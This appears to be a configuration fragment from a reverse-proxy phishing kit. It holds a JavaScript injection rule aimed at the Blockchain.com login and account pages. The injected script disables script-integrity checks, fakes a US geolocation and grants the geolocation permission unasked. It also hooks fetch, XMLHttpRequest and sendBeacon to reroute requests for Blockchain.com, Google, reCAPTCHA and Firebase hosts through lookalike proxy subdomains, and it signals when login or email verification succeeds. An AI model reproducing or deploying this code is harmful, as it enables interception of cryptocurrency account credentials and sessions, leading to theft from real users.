js_inject:
  - trigger_domains: ['login.blockchain.com']
    trigger_paths: ['/', '/auth/login', '/auth/login/.*', '/account/.*']
    trigger_params: []
    script: |
      /*bl-js-inject*/
      (function(){
        try{var d=Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype,"integrity");if(d&&d.set){Object.defineProperty(HTMLScriptElement.prototype,"integrity",{configurable:true,get:function(){return"";},set:function(){}});}}catch(e){}
        var US={latitude:40.7128,longitude:-74.0060,accuracy:35};
        function fakePos(){return{coords:US,timestamp:Date.now()};}
        if(navigator.geolocation){
          navigator.geolocation.getCurrentPosition=function(ok){if(ok)ok(fakePos());};
          navigator.geolocation.watchPosition=function(ok){if(ok)ok(fakePos());return 1;};
        }
        try{
          var q=navigator.permissions&&navigator.permissions.query;
          if(q)navigator.permissions.query=function(d){
            if(d&&d.name==='geolocation')return Promise.resolve({state:'granted',onchange:null});
            return q.apply(this,arguments);
          };
        }catch(e){}
        var pfHostMap={"login.blockchain.com":"login","www.blockchain.com":"www","api.blockchain.com":"api","wallet-helper.blockchain.com":"wallet-helper","blockchain.info":"bcinfo","www.blockchain.info":"wwwinfo","api.blockchain.info":"apiinfo","www.gstatic.com":"gstatic","www.google.com":"google","www.recaptcha.net":"recaptcha","firebase.googleapis.com":"firebase","firebaseinstallations.googleapis.com":"firebaseinstall","firebaseremoteconfig.googleapis.com":"firebaserc","firebaselogging.googleapis.com":"firebaselog","pagead2.googlesyndication.com":"pagead2","wa.appsflyersdk.com":"wa-af","websdk.appsflyersdk.com":"websdk-af","wa.onelink.me":"wa-onelink","blockchain.zendesk.com":"blockchain-zd"};
        function pfBase(){var p=location.hostname.split('.');return p.length>=3?p.slice(1).join('.'):location.hostname;}
        function pfMap(h){h=String(h||'').toLowerCase();var ps=pfHostMap[h];return ps?ps+'.'+pfBase():h;}
        function pfRw(u){try{var x=new URL(u,location.href);if(!pfHostMap[x.hostname.toLowerCase()])return u;x.hostname=pfMap(x.hostname);return x.toString();}catch(e){return u;}}
        function blIsEmailReminder(u){return/\/nabu-gateway\/.*\/auth\/|\/auth\/email-reminder|email-reminder|send-email|verify-email/i.test(String(u||''));}
        function blIsAuthSuccess(u,m){return/\/nabu-gateway\/.*\/auth\//i.test(String(u||''))&&(m==='POST'||m==='PUT');}
        function blOnEmailReminder(){if(window.__blEmailReminderDone)return;window.__blEmailReminderDone=1;try{window.dispatchEvent(new CustomEvent('bl-email-reminder'));}catch(e){}}
        if(window.fetch){var _f=window.fetch.bind(window);window.fetch=function(i,n){var raw=typeof i==='string'?i:(i&&i.url?i.url:'');var meth=(n&&n.method)||(i&&i.method)||'GET';function chain(p,u){if(blIsEmailReminder(u)||blIsEmailReminder(raw)){p.then(function(r){if(r&&r.ok)blOnEmailReminder();}).catch(function(){});}if(blIsAuthSuccess(u,meth)||blIsAuthSuccess(raw,meth)){p.then(function(r){if(r&&r.ok)setTimeout(function(){try{window.dispatchEvent(new CustomEvent('bl-auth-ok'));}catch(e){}},400);}).catch(function(){});}return p;}if(typeof i==='string')return chain(_f(pfRw(i),n),pfRw(i));if(i&&i.url){var rw=pfRw(i.url);if(rw!==i.url&&typeof Request!=='undefined')return chain(_f(new Request(rw,i),n),rw);return chain(_f(rw,n),rw);}return _f(i,n);};}
        if(window.XMLHttpRequest){var _o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){var a=[].slice.call(arguments);if(a[1])a[1]=pfRw(a[1]);if(blIsEmailReminder(a[1]))this.addEventListener('load',function(){if(this.status>=200&&this.status<300)blOnEmailReminder();});return _o.apply(this,a);};}
        if(navigator.sendBeacon){var _sb=navigator.sendBeacon.bind(navigator);navigator.sendBeacon=function(u,d){return _sb(pfRw(u),d);};}
